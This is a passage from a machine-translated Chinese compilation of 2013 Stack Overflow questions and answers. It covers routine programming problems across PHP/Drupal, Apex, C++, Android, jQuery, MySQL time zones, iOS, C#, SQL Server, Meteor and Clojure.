$query = "SELECT sweep_table.end_offer, sweep_table.title, embed.fbp_id, embed.sweep_stat 
    FROM sweep_table, embed 
    WHERE sweep_table.uid=embed.uid AND sweep_table.promo_id=embed.sweep_id"; 
```

我已经做了前几行，但其余的，我不知道怎么做。

```
$terms = db_select('sweep_table', 'embed')
  ->fields('sweep_table', array('end_offer', 'title'))
  ->fields('embed', array('fbp_id', 'sweep_stat'))
  ->leftJoin('taxonomy_term_data', 'ttd', 'ti.tid = ttd.tid') //Don't know how to apply to my query.
  ->condition('vid', 2)
  ->condition('nid', $nid)
  ->execute();

foreach ($terms as $term) {

} 
```

另外，想知道我成功 LEFT JOIN 后如何检索数据？

如果你能帮助我，我会很高兴。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:31:23.140

不会想到这会起作用。感谢 rekire 的提示。

```
$query = "SELECT sweep_table.end_offer, sweep_table.title, embed.fbp_id, embed.sweep_stat FROM sweep_table, embed WHERE sweep_table.uid=embed.uid AND sweep_table.promo_id=embed.sweep_id";
$result = db_query($query);
foreach ($result as $row) {
    echo $row->end_offer . " " . $row->title . " " . $row->fbp_id . " " . $row->sweep_stat . "<br>";
} 
```

# salesforce - 如何退出顶点功能？

> ID：14847524
> 
> 赞同：8
> 
> 时间：2013-02-13T06:11:35.820
> 
> 标签：salesforce, apex-code, visualforce

我有一个具有 void 返回类型的顶点函数。我想在特定位置退出该功能。在不更改返回类型页面引用的情况下，这可能在顶点中实现吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-02-13T07:58:58.403

**在 apex 中，return 关键字表示立即停止处理该函数中的语句。**

```
public void doNothing() {
     return;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:48:06.083

我不确定我是否正确理解了您的问题（更详细的描述会很有用），但您似乎可以通过以下方式使用 return 语句：

```
public PageReference method() {
    //some your code ....
    if (some specific condition) { 
        return null;
    }

    PageReference pageRef = new PageReference('someURL');
    return pageRef;
} 
```

请显示您的代码以获得更多目标帮助

# c++ - 我想出错误的结果来计算字符串中的字符

> ID：14847526
> 
> 赞同：1
> 
> 时间：2013-02-13T06:11:45.387
> 
> 标签：c++, string

我正在尝试计算一行中出现的字母。但是我的结果是错误的。我将只介绍我认为包含错误的功能。

```
void readAndCount(int &numWords, int letterCount[])
{
    //set letterCount[] numwords initial values
    memset(letterCount, 0, 26);
    numWords = 1;

    char a = ' ';
    while(a != '\n')
    {
        a = getc(stdin);
        if (a == ' ' || a == ',' || a == '.' || '\n')
            ++numWords;
        else
            if(a >= 'A' && a <= 'Z')
            {
                ++letterCount[a - 'A'];
            } else if (a >= 'a' && a <= 'z') {
                ++letterCount[a - 'a'];
            }
    }

    return;
} 
```

这是一个字符串产生：

```
3 words
1 a
4194305 g
1 h
3 i
4196355 k
32630 n
4197445 o
32630 r
4197379 s
2 t
4196576 w
32767 z 
```

在读取输入之前，我已经尝试过 fflush()ing stdin。任何指针将不胜感激，但请不要只为我写。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:14:34.923

`memset(letterCount, 0, 26)`将 26*字节*的内存清零，而不是您想要`letterCount`的 26个*整数。*怎么样`memset(letterCount, 0, 26*sizeof(int))`？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T06:25:10.540

由于这被标记为[c++ ，因此将对](/questions/tagged/c%2b%2b "显示标记为“c++”的问题")[c](/questions/tagged/c "显示标记为“c”的问题")的调用替换为`memset()`：

```
std::fill(letterCount, letterCount + 26, 0); 
```

或者：

```
std::fill_n(letterCount, 26, 0); 
```

...这将修复数组初始化。您在“f”之后看到的任意数字是加载程序之前 RAM 中的任何垃圾。

另外，这个：

```
if (a == ' ' || a == ',' || a == '.' || '\n') 
```

应该：

```
if (a == ' ' || a == ',' || a == '.' || a == '\n') 
```

**注意：**在[c++](/questions/tagged/c%2b%2b "显示标记为“c++”的问题")中，我们更喜欢[**`std::cin.get(a);`**](http://en.cppreference.com/w/cpp/io/basic_istream/get)c [（](/questions/tagged/c "显示标记为“c”的问题")但这`a = getc(stdin);`对代码的执行方式没有影响，只是风格问题）。

# android - 如何使用变量的值作为变量

> ID：14847528
> 
> 赞同：0
> 
> 时间：2013-02-13T06:11:56.050
> 
> 标签：android, variables

在为android编码时还没有遇到过这个。那么如何将一个变量的值用作新变量。

我想把像“file1.mp3”这样的变量的值去掉扩展名，然后将文本附加到变量中，并将其用作像file1_title.txt和file1_desc.txt这样的变量名。

* * *

所以 fName[1] 可能等于 file1.mp3

然后我想创建新变量

file1_title.txt 等于“歌曲标题一”

file1_desc.txt 等于“文件一的描述”

都基于 fname[1] 的值

* * *

fName[2] 等于 file2.mp3

file2_title.txt 等于“歌曲标题二”

file2_desc.txt 等于“文件二的描述”

都基于值 fName[2]

* * *

ETC...

这是如何为android完成的

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:13:42.727

我不是 100% 确定我了解您的问题的详细信息，但请使用地图。“key”是歌名，value 是描述。

一些跟进。大量的挥手，没有错误检查。假设有一个 mp3 文件进入，并且您以某种方式从 MP3 文件中的标签中读取了标题和描述。YMMV

```
// TreeMap will sort by titles which seems reasonable
Map<String, String> songMapTitleToDesc = new TreeMap<String, String>();

MyMP3Reader mmp3r = new MyMP3Reader(File inFile);
String songTitle = mmp3r.getSongTitle();
String songDesc = mmp3r.getSongDesc();
songMapTitleToDesc.put(songTitle, songDesc);
mmp3r.close();  // or whatever 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:22:26.037

不确定这是否是您要查找的内容。它是基本的 Java 字符串格式。

```
String attr1 = "song.mp3";
String attr2 = attr1.split(".")[0] + ".txt"; 
```

自然地添加必要的空检查。

==更新==

因此，如果我对您的理解正确，您会得到一个文件名（“asd.mp3”）并需要歌曲名称及其描述。

```
String attr1 = "song.mp3";
String songname = "";
String songdesc = "";
String[] splitArray = attr1.split(".");
if(splitArray[0] != null){
    String songname = attr1.split(".")[0];
    File f = new File(path + songname +".txt");
    //I didn't quite understand in what format you get the data, 
    //especially the  description. However, it could be in a map 
    //where the songname is the key, as suggested above, and here you would write that description to file(f) 
```

}

# jquery - 如何定位特定表行输入中的所有输入

> ID：14847530
> 
> 赞同：0
> 
> 时间：2013-02-13T06:12:13.213
> 
> 标签：jquery

我有一个下表结构。

```
<table>
 <thead>
  <tr>
   <td>id</td>
   <td>Name</td>
   <td>Total</td>
  </td>

  <tbody>

   <tr>
    <td><input type="text" name="" /></td>  
    <td><input type="text" name="" /></td>
    <td><input type="text" name="total" /></td>
   </tr>

   <tr>
    <td><input type="text" name="" /></td>  
    <td><input type="text" name="" /></td>
    <td><input type="text" name="total" /></td>
   </tr>

  </tbody> 
```

如何使用 jquery 获取每行的总值到总列。我试过这样。

```
var total;

$("table tbody tr td input[type=text]").live('keyup blur', function(){

   $(this).parent('tbody tr').find('input[type=text]').each(function(){
        var tot +=  $(this).val();
   });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:13:56.953

将其更改为：

```
$("table tbody tr td input[type=text]").live('keyup blur', function(){

   $(this).parent('tr').find('input[type=text]').each(function(){
        var tot +=  $(this).val();
   });
}); 
```

原因是，`<tbody>`包含所有的`<tr>`s。所以现在以这种方式更新，它只选择`<tr>`当前行并选择其中的所有输入。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:29:42.413

你可以只使用 parent();

> parent() 仅在 DOM 树上单层遍历。

所以这应该带你去`<tr>`

```
$(this).parent().find('input[type=text]').each(function(){
   ...
}); 
```

# php - 数据库时区

> ID：14847534
> 
> 赞同：1
> 
> 时间：2013-02-13T06:12:38.487
> 
> 标签：php, mysql, sql, phpmyadmin, timezone

我想在单个 cpanel（Phpmyadmin）上为不同的数据库设置不同的时区。我不知道如何为不同的数据库设置不同的时区。请帮帮我..这可能与否，

提前致谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:18:18.443

如果您使用的是 PHP/MYSQL。将以下代码放在页面或索引页面的顶部。

`date_default_timezone_set('timezone_name');`例子`America/New_York`

仅 MySQL（仅适用于当前会话）

`mysql> SET time_zone = 'timezone_name';`

对于全球变化

`mysql> SET GLOBAL time_zone = 'timezone_name';`

希望这可以帮助。谢谢！！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T13:30:50.797

我同意上面的评论和回答，您不能更改同一 MYSQL 服务器上每个数据库的时间设置。

除了 Madan Sapkota 的回答之外，我还想补充以下内容。

在使用时间/日期值的查询开始时，您从 SET TIME_ZONE = ""; 然后继续您的正常查询。

查询数据库的另一种方法是使用 convert_tz() 函数。

```
CONVERT_TZ(column_name,'+00:00','-05:00')
CONVERT_TZ(column_name,'UTC','America/New_York') 
```

第一个数字/名称是当前时区，第二个是所需时区。要检查您的数据库正在使用哪个时区，请`SELECT @@global.time_zone, @@session.time_zone;`在命令行中使用。

进一步阅读：[如何在存储日期和时间的应用程序中处理多个时区？](https://stackoverflow.com/questions/3207976/how-does-one-deal-with-multiple-timezones-in-applications-that-store-dates-and-t),[如何正确设置mysql时区](https://stackoverflow.com/questions/8434030/how-to-correctly-set-mysql-timezone)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-01T11:10:19.087

捕获 CURRENT_TIMESTAMP 时我遇到了同样的问题。

我通过以下方式解决了它：

在您的数据库类中有一个带有 this 查询的类`SET @@session.time_zone = '+02:00';`，在您的构造中（确保您放置时区）。每次查询数据库时都必须执行此操作。

我希望这有帮助。

# uitableview - 在 UITableView 中滚动后数据丢失

> ID：14847538
> 
> 赞同：0
> 
> 时间：2013-02-13T06:12:48.950
> 
> 标签：uitableview, ios6, plist

我正在尝试在 tableview 中显示 plist 数据。

我的问题是，向下滚动后，我丢失了以前获取的数据。实际上我正在使用自定义单元格，所以我认为这是发生的。

表的源代码和委托代码如下。

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
return [tableData count];
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

 static NSString *kCellID = @"Cell";

OffersCustomCell *cell = (OffersCustomCell *)[mytableView dequeueReusableCellWithIdentifier:kCellID];
if (cell == nil)
{

    NSString *path = [[NSBundle mainBundle] pathForResource:@"OffersList" ofType:@"plist"];

    NSArray *nib = [[NSBundle mainBundle] loadNibNamed:@"OffersCustomCell" owner:self options:nil];

    cell = [nib objectAtIndex:0];

    cell.titleLabel.font = [UIFont fontWithName:@"Formata-Regular" size:13.0f];
    cell.saveLabel.font = [UIFont fontWithName:@"Formata-Bold" size:14.0f];
    cell.nowLabel.font = cell.titleLabel.font;

    cell.selectionStyle = UITableViewCellSelectionStyleNone;

}

NSDictionary *dict = [tableData objectAtIndex:indexPath.row];
NSLog(@"%@",dict);

cell.titleLabel.text = [dict  objectForKey:@"title"];
cell.nowLabel.text = [dict objectForKey:@"price"];
cell.saveLabel.text = [dict objectForKey:@"rondel"];
cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;
return cell;
}
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
       [mytableView deselectRowAtIndexPath:indexPath animated:YES];
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T08:03:22.193

您是否为每个单元格设置了高度

```
- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath {

    CGFloat height = 0;
    //calculate height for each cell

    return height;
} 
```

使用此 UITableView 委托方法来设置单元格的高度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T08:06:10.450

您可以使用另一个类来存储您的数据并重新加载您使用该类的时间，并正确有效地恢复您的数据。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-14T05:13:48.407

我解决了。:)

唯一的问题是 UItableview 没有保留内存。

```
 tableData = [[NSArray arrayWithObjects:[dic objectForKey:@"Response"], nil] retain]; 
```

# java - 转换数组列表< > 到数组

> ID：14847541
> 
> 赞同：0
> 
> 时间：2013-02-13T06:12:52.290
> 
> 标签：java, android

我想从中检索值`getNombre()`并将其放入一个新数组而不是数组列表中。该工作是从后台任务完成的。

```
public class Post {

private String nombre;

public void setNombre(String nombre) {

    this.nombre = nombre;

}

public String getNombre() {

    return nombre;

}
} 
```

我按如下方式调用我的postlist：

```
ArrayList<Post> PostList = new ArrayList<Post>(); 
```

在我的后台任务中，我有以下帖子借口方法。

```
@Override
protected void onPostExecute(ArrayList<Post> result) {

} 
```

如何将`getNombre()`值放入新数组中，而不是`ArrayList`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T07:03:03.627

您可以使用以下代码将 ArrayList 中所有 Post 的 getNombre() 返回的值放入 String[]。

```
protected String[] getAllNombres( ArrayList<Post> posts ) {
    String[] nombres = new String[ posts.size ];
    int i = 0;
    for( Post post : posts ) {
        nombres[i++] = post.getNombre();
    }
    return nombres;
} 
```

# android - Android中的手势

> ID：14847543
> 
> 赞同：0
> 
> 时间：2013-02-13T06:13:08.923
> 
> 标签：android, imageview, gestures

我的 android 应用程序中有 30 多张图片。我打算在用户向左或向右滑动时一次显示一张图片。

做这个的最好方式是什么？你能指出一些工作的例子吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:16:00.833

尝试使用图库。这是链接 - [http://developer.android.com/reference/android/widget/Gallery.html](http://developer.android.com/reference/android/widget/Gallery.html)

和

[http://www.mobisoftinfotech.com/blog/android/android-gallery-widget-example-and-tutorial/](http://www.mobisoftinfotech.com/blog/android/android-gallery-widget-example-and-tutorial/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T08:12:02.347

```
 see this ...
    http://developer.android.com/reference/android/view/GestureDetector.html
You can use Gesture Detector class so detect left,rigth,up down swipes 
```

# java - 如何从音轨中删除人声，最好是 mp3

> ID：14847547
> 
> 赞同：0
> 
> 时间：2013-02-13T06:13:18.787
> 
> 标签：java, android, audio, mp3, jmf

有没有人尝试或开发过从 mp3 文件中删除声音数据而留下 midi/背景音乐轨道的应用程序。

是否有任何开源库可以完成以及可以实现多远。

如果有的话，请欣赏这些想法。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T13:33:50.630

这是一个迟到的答案，但是您是否曾经为此尝试过硬件解决方案。只需使用连接到扬声器插孔的电容滤波来阻止人声级频率。然后使用麦克风输入重新录制输出。

穆罕默德

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:16:41.193

尝试大胆。我相信它有一个试图做到这一点的功能。不确定它的效果如何。

[http://audacity.sourceforge.net/](http://audacity.sourceforge.net/)

# python - 熊猫：DataFrame.sum() 或 DataFrame().as_matrix.sum()

> ID：14847551
> 
> 赞同：3
> 
> 时间：2013-02-13T06:13:39.963
> 
> 标签：python, pandas

我正在编写一个函数来计算 pd.DataFrame 中所有列的条件概率，该数据帧具有约 800 列。我写了几个版本的函数，发现两个主要选项的计算时间有很大差异：

```
col_sums = data.sum()   #Simple Column Sum over 800 x 800 DataFrame 
```

**选项 #1：** {'col_sums' 和 'data' 分别是 Series 和 DataFrame}

[这包含在 index1 和 index2 上的循环中以获取所有组合]

```
joint_occurance = data[index1] * data[index2]
sum_joint_occurance = joint_occurance.sum()
max_single_occurance = max(col_sum[index1], col_sum[index2])
cond_prob = sum_joint_occurance / max_single_occurance #Symmetric Conditional Prob
results[index1][index2] = cond_prob 
```

比。

**选项 #2：** [在循环 index1 和 index2 以获取所有组合时] 唯一的区别不是使用 DataFrame 我在循环之前将 data_matrix 导出到 np.array

```
new_data = data.T.as_matrix() [Type: np.array] 
```

选项 #1 运行时间约为 1700 秒 选项 #2 运行时间约为 122 秒

**问题：**

1.  将 DataFrames 的内容转换为 np.array 最适合计算任务吗？
2.  pandas 中的 .sum() 例程与 NumPy 中的 to .sum() 例程有显着不同，还是由于标签访问数据而导致的速度差异？
3.  为什么这些运行时如此不同？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T06:11:26.187

在阅读我遇到的文档时：

> **第 7.1.1 节 快速标量值获取和设置**由于使用 [] 进行索引必须处理很多情况（单标签访问、切片、布尔索引等），因此它需要一些开销才能弄清楚你的内容。重新要求。如果您只想访问一个标量值，最快的方法是使用 get_value 方法，该方法在所有数据结构上都实现：

```
In [656]: s.get_value(dates[5])
Out[656]: -0.67368970808837059
In [657]: df.get_value(dates[5], ’A’)
Out[657]: -0.67368970808837059 
```

**最佳猜测：** 因为我从数据框中多次访问单个数据元素（每个矩阵约 640,000 个）。我认为速度降低来自我引用数据的方式（即“使用 [] 进行索引处理很多情况”），因此我应该使用 get_value() 方法访问类似于矩阵查找的标量。

# shell - 如何将邮件提取到指定文件夹？

> ID：14847554
> 
> 赞同：0
> 
> 时间：2013-02-13T06:13:50.697
> 
> 标签：shell

我安装了fetchmail。

```
debian@debian:~$ fetchmail -p POP3 -u myaccount   pop.163.com 
```

输入 myaccount@pop.163.com 的密码：
myaccount 在 pop.163.com 的 2 条消息（23852 个八位字节）。
阅读消息 myaccount@pop3.163.idns.yeah.net:1 of 2 (10814 octets) 已刷新
阅读消息 myaccount@pop3.163.idns.yeah.net:2 of 2 (13038 octets) 已刷新

我的邮件在哪里？我怎样才能把它下载到/tmp？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:21:22.163

默认情况下，[fetchmail](http://fetchmail.berlios.de/)将发送到本地 SMTP 服务器。您需要在其配置中决定邮箱的存储位置。

# c# - 订单相关类型

> ID：14847557
> 
> 赞同：1
> 
> 时间：2013-02-13T06:14:08.320
> 
> 标签：c#

我有一个创造性的问题。我想给类型一个依赖于依赖项的顺序。:)

例子：

```
public class Oil
{}

public class Seat
{}

public class Wheel : IDependOn<Oil>
{}

public class Car : IDependOn<Wheel>, IDependOn<Seat>
{} 
```

所以，现在我想要一个函数（包括反射），它给我一个索引是顺序的`Dictionary<Int32, Type>`地方。`Int32`

函数定义如下所示：

```
public Dictionary<Int32, Type> GetOrderedTypes(List<Type> types); 
```

这个例子的结果应该是：

```
<1, Oil>
<2, Seat>
<3, Wheel>
<4, Car> 
```

任务可能要复杂得多，但将具有相同的逻辑。

*   没有依赖关系的类型具有最低的顺序。
*   对于具有相同依赖关系的类型，顺序并不重要。

任何人都可以在这方面帮助我吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:55:55.673

这是您的问题的解决方案：

```
interface IDependOn<T> { }

class Oil { }

class Seat { }

class Wheel : IDependOn<Oil> { }

class Car : IDependOn<Wheel>, IDependOn<Oil> { }

static class TypeExtensions {

  public static IEnumerable<Type> OrderByDependencies(this IEnumerable<Type> types) {
    if (types == null)
      throw new ArgumentNullException("types");
    var dictionary = types.ToDictionary(t => t, t => GetDependOnTypes(t));
    var list = dictionary
      .Where(kvp => !kvp.Value.Any())
      .Select(kvp => kvp.Key)
      .ToList();
    foreach (var type in list)
      dictionary.Remove(type);
    foreach (var keyValuePair in dictionary.Where(kvp => !kvp.Value.Any())) {
      list.Add(keyValuePair.Key);
      dictionary.Remove(keyValuePair.Key);
    }
    while (dictionary.Count > 0) {
      var type = dictionary.Keys.First();
      Recurse(type, dictionary, list);
    }
    return list;
  }

  static void Recurse(Type type, Dictionary<Type, IEnumerable<Type>> dictionary, List<Type> list) {
    if (!dictionary.ContainsKey(type))
      return;
    foreach (var dependOnType in dictionary[type])
      Recurse(dependOnType, dictionary, list);
    list.Add(type);
    dictionary.Remove(type);
  }

  static IEnumerable<Type> GetDependOnTypes(Type type) {
    return type
      .GetInterfaces()
      .Where(i => i.IsGenericType && i.GetGenericTypeDefinition() == typeof(IDependOn<>))
      .Select(i => i.GetGenericArguments().First());
  }

} 
```

您可以像这样创建有序列表：

```
var orderedList =
  new[] { typeof(Oil), typeof(Seat), typeof(Wheel), typeof(Car) }
    .OrderByDependencies(); 
```

如果您想要一个以索引为键的字典，您可以轻松地从有序列表中创建它。

# c# - FindResource 返回空图像

> ID：14847559
> 
> 赞同：0
> 
> 时间：2013-02-13T06:14:22.083
> 
> 标签：c#, wpf, image, resources, find

在主窗口 XAML 中，我添加了资源 Image **my_image**。在代码中，找到它的函数 FindResource ，该函数返回一个非空值。但是里面的 img.Source 是空的。我究竟做错了什么？

```
//xaml
    <Window.Resources>
        <Image x:Key="my_image" Source="Properties/images/device1.png"/>
    </Window.Resources>

//c# code

    Image img=this.FindResource("my_image") as Image; 
```

更新：通过将程序集类型作为资源来解决问题。并且还必须创建 Image **img_new**的新实例。并给它一个从资源中获得的来源。然后正常情况下，我们可以使用**img_new**。

```
 Image img=this.FindResource("my_image") as Image;
 Image img_new=new Image();
 img_new.Source=img.Source; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:52:24.367

将 device1.png 的 Build Action 更改为 Resource from Content

# sql-server-2008 - 如何根据一列的值更新不同的列

> ID：14847563
> 
> 赞同：0
> 
> 时间：2013-02-13T06:14:49.157
> 
> 标签：sql-server-2008

我正在使用 SQL Server 2008。我有 2 个表

**指标**

```
Id   |   Region 
```

**指标12**

```
Id   |   Name  | South America |North America 
```

现在我需要更新南美洲 (SA)、北美 (NA) 列，如果 `Indicator`表中的特定 id 映射到两个区域，那么 SA 和 NA 列都应该标记为`YES`else，如果它只映射到一个区域，然后是相应的列in`Indicator12`应标记为`YES`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:26:27.030

我想这就是你所追求的——

```
update Indicator12
set [South America] = case when Indicator.Region = 'SA'
                           then 'YES'
                           else Indicator12.[South America]
                      end,
    [North America] = case when Indicator.Region = 'NA'
                           then 'YES'
                           else Indicator12.[North America]
                      end           
from Indicator12
join Indicator
    on (Indicator12.Id = Indicator.Id) 
```

# c# - 如何在网格内一一显示逗号分隔值

> ID：14847564
> 
> 赞同：-3
> 
> 时间：2013-02-13T06:14:49.767
> 
> 标签：c#, asp.net

我有一个数据网格，在网格内我有五列。在一列中，我正在显示无组织的逗号分隔值。网格视图就像

```
 Col1          Col2          Col3                   Col4           Col5  
      1             a         [acvdfvd], [dfasfsd        20              10
                              dfdfs],[sdfdsf][sadsa
                              fsfesf],[adsdas],
                              [dsfsdfdf],[dfss]
      2             b             "                       30              20 
```

现在，我想显示这样的值，

```
 Col1          Col2          Col3                   Col4           Col5  
   1             a          [acvdfvd],                 20              10
                            [dfasfsddfdfs],
                            [sdfdsf],
                            [sadsafsfesf],
                            [cxadsdas],
                            [dsfsdfdf],
                            [dfss]

      2             b             "                       30              20 
```

这至少是可以理解的。请帮助我如何做到这一点。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:18:21.417

看来您希望在每个逗号分隔值之后有一个新行。您可以使用 string.Replace 为此目的`Environment.NewLine`

```
string str = str.Replace(",", "," + Environment.NewLine); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:27:12.383

使用模板字段.....像这样

```
<asp:TemplateField>
        <ItemTemplate>
        <asp:Label ID="txt" Text='<%# Bind("Col3") %>' runat="server"></asp:Label>
        </ItemTemplate>
        </asp:TemplateField> 
```

在后端添加（中断）标签后，（逗号）

这里 Col3 将具有值

```
 [acvdfvd],<br />[dfasfsddfdfs],<br />[sdfdsf][sadsafsfesf] etc 
```

希望能帮助到你！！！！。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:18:00.087

尝试在每个逗号后插入 <br/> 标签。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T06:19:34.493

你是如何生成那一列值的？从您的标签中，如果它是 C#，您可以在逗号后附加一个 Environment.NewLine

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T06:16:37.003

在每个逗号 (,) 之后添加`<br />`标记。这将为新行带来下一个值。

# javascript - 如何更改已动态添加到 div 的图像的源 URL？

> ID：14847573
> 
> 赞同：1
> 
> 时间：2013-02-13T06:15:46.660
> 
> 标签：javascript, html

我有一个 div，我在其中动态添加图像。

```
div.append('<img class="prod48" src="' + url + '" />'); 
```

现在`url`由`focusout`文本框设置，具体取决于其中的文本。由于 append 函数将继续追加，我应该如何更改它`url`而不在`div`? 只有在第一次`focusout`调用时，我才应该能够附加和休息时间来更新 url。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:19:54.000

如果要在将图像元素添加到文档后对其进行更新，则必须有某种方式来引用它。

几个想法立刻浮现在脑海：

1.  给图像一个唯一的 ID，然后使用它：

    ```
    # First, change the html to include an id
    div.append('<img id="abcdef1234" class="prod48" src="' + url + '" />');

    #...
    # Later, grab the image by its id and change the source url
    var img = document.getElementById('abcdef1234');
    img.src = newUrl; 
    ```

2.  或者，第一次动态构建图像，并将元素保存在变量中：

    ```
    # First, create an element, and hold it in a variable:
    var img = document.createElement('img');
    img.className = "prod48";
    img.src = url;
    # Now append it to the div:
    div.append(img);

    #...
    # Later, we still have that element, so we can just change the source URL:
    img.src = newUrl; 
    ```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T06:29:37.370

HTML：

```
<input type="text" id="url">
<div id="image_div">
    Will append image tag to this :     
</div> 
```

查询：

```
$(document).ready(function(){
$('#image_div').html("<img src='' class='prod48'>");       //will replace image
    $('#url').change(function(){        
        $('.prod48').attr('src',$('#url').val());
    });
}); 
```

JSFiddle：[这里](http://jsfiddle.net/nishantjani10/QMw85/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:22:01.123

为图像提供一个 ID，此代码可能会对您有所帮助..

```
$("img").attr("src", "/img/circleGraph/circle"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T06:28:17.780

如果您使用的是 jQuery，您可以执行以下操作：

```
var div = $('div');

div.append("<img src='"+url+"' />");

div.find("img").attr("src", newUrl); 
```

# meteor - 流星用户配置文件只能在刷新后读取

> ID：14847575
> 
> 赞同：1
> 
> 时间：2013-02-13T06:15:50.233
> 
> 标签：meteor

对于用户数据，我有一个如下所示的发布/订阅：

```
Meteor.publish("allUserData", function () {
    return Meteor.users.find({}, {
            fields: { "emails": 1, "_id": 1, "profile": 1 }
        }
    );
});

Meteor.subscribe("allUserData"); 
```

但是，当我尝试阅读配置文件时，它总是未定义，直到我刷新页面，然后我才能阅读它。我正在尝试按如下方式阅读个人资料：

```
Meteor.user().profile 
```

我究竟做错了什么？为什么刷新页面时它可以工作，但在初始加载时却不行？我已经在发布函数中尝试了带引号和不带引号的属性名称......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T13:32:56.500

Meteor.user().profile 在 Meteor.user() 之后的几分之一秒后才可用。此外，当创建用户帐户时，它没有配置文件。解决方案是在反应函数中使用超时。

```
Meteor.autorun(function(handle) {
  if (Meteor.user()) {
    if (Meteor.user().profile) {
      // use profile
      handle.stop()
    }
    else {
      setTimeout(function(){
        if (!Meteor.user().profile) {
          // new user - first time signing in
          Meteor.users.update(Meteor.userId(), {
            $set: {
              'profile.some_attribute': some_value
            }
          })
        }
      }, 2000)
    }
  }
}) 
```

# tcp - 如何将（Clojure）Aleph TCP 服务器绑定到 TCP v4 端口？

> ID：14847582
> 
> 赞同：1
> 
> 时间：2013-02-13T06:16:06.343
> 
> 标签：tcp, clojure, netty

几天前我开始学习 Clojure。我正在尝试一些 Aleph TCP 回显服务器示例，但我无法让服务器绑定到 tcp v4 端口。服务器默认只绑定到一个 tcp v6 端口。

这是我的项目文件：

```
(defproject clj-echo-server "0.1.0-SNAPSHOT"
  :description "Echo server with Aleph"
  :url "http://example.com/FIXME"
  :license {:name "Eclipse Public License"
  :url "http://www.eclipse.org/legal/epl-v10.html"}
  :dependencies [[org.clojure/clojure "1.4.0"]
                 [aleph "0.3.0-beta12"]]
  :main clj-echo-server.core) 
```

和服务器代码：

```
(ns clj-echo-server.core)

(use 'lamina.core 'aleph.tcp 'gloss.core)

(defn handler [ch client-info]
  (receive-all ch
    #(enqueue ch (str "You said " %))))

(start-tcp-server
  handler
  {:port 9000, :frame (string :utf-8 :delimiters ["\r\n"])}) 
```

我可以弄清楚我是否做错了什么或如何配置绑定端口，文档对 tcp 端口不是很有帮助。

我的操作系统是 Ubuntu 12.04.2 LTS，Leiningen 版本是 2.0.0-preview10，全部运行在 Java 1.6.0_24 OpenJDK 64 位服务器 VM 上。

谁能告诉我如何为 tcp 服务器配置端口绑定？

谢谢你的时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T08:41:16.030

它可能绑定到您的本地主机接口，而不是您希望它使用的任何面向外部的网卡。我不具体了解 aleph 的 tcp 服务器，但大多数服务器允许您指定要侦听的接口作为 IP 地址：如果给定 v4 地址，那么它会做您想做的事。对于 aleph，也许是`:host`or `:interface`？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T06:42:02.747

抱歉回复晚了，但我`:host`在`0.3.0-SNAPSHOT`. 这应该已经在那里了，谢谢你发现我的疏忽。

# windows - winzip中的拖放是如何工作的？

> ID：14847584
> 
> 赞同：0
> 
> 时间：2013-02-13T06:16:15.577
> 
> 标签：windows

使用 winzip，您可以将文件从 zip 文件拖到资源管理器中。这是如何运作的？在资源管理器可以复制文件之前，winzip 必须先解压缩它，并且必须在资源管理器复制它之前执行此操作。winzip 是否实现了文件系统驱动程序，或者有没有办法检测何时发生丢弃事件？

我想在我的应用程序中实现类似的事情 - 允许将文件从程序拖动到 Windows，但该文件尚不存在。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T14:28:22.083

